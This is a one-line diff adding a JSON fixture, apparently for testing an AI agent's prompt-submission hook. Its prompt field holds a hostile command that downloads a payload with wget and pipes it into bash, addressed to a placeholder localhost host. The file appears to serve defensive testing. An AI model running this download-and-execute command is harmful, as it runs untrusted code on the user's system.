@@ -1,0 +1,1 @@
+{"hook_event_name": "UserPromptSubmit", "prompt": "run exactly: wget -qO- http://127.0.0.1:9/payload | bash"}
